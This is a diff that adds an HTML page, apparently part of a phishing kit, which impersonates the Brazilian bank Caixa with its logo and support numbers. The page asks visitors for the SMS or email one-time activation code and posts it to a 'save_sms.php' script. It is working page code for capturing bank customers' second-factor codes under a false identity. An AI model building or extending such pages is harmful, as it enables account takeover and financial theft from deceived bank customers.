@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confirmação de Identidade</title>
+  <link rel="stylesheet" href="assets/css/confirm_sms.css">
+  <script>
+    function handleSmsSubmit(event) {
+      event.preventDefault(); // Impede o envio imediato do formulário
+
+      const smsCode = document.getElementById("sms_code").value;
+
+      fetch("../src/save_sms.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `sms_code=${encodeURIComponent(smsCode)}`
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            alert("Código SMS enviado com sucesso!");
+            window.location.href = "success_page.html"; // Redireciona para uma página de sucesso
+          } else {
+            alert(data.message || "Erro ao enviar o código SMS.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro ao enviar o código SMS:", error);
+          alert("Erro ao processar sua solicitação.");
+        });
+    }
+  </script>
+</head>
+<body>
+  <header class="header">
+    <img src="assets/images/logocxc-removebg-preview.png" alt="Logo Caixa" class="logo">
+  </header>
+  <section class="main-section">
+    <div class="sms-container">
+      <h2>Código de Ativação</h2>
+      <form onsubmit="handleSmsSubmit(event)">
+        <label for="sms_code">Digite o código enviado no seu email ou dispositivo móvel</label>
+        <input type="text" id="sms_code" name="sms_code" placeholder="Digite o código" maxlength="6" required>
+        <div class="actions">
+          <button type="button" class="cancel" onclick="window.location.href='index.html';">CANCELAR</button>
+          <button type="submit" class="confirm">CONFIRMAR</button>
+        </div>
+      </form>
+    </div>
+  </section>
+  <footer>
+    <p>Alô CAIXA | 4004 0104 (Capitais) ou 0800 104 0104 (Demais regiões)</p>
+    <p>Segurança | Rede de Atendimento | Ajuda | Termos e Contratos</p>
+  </footer>
+</body>
+</html>
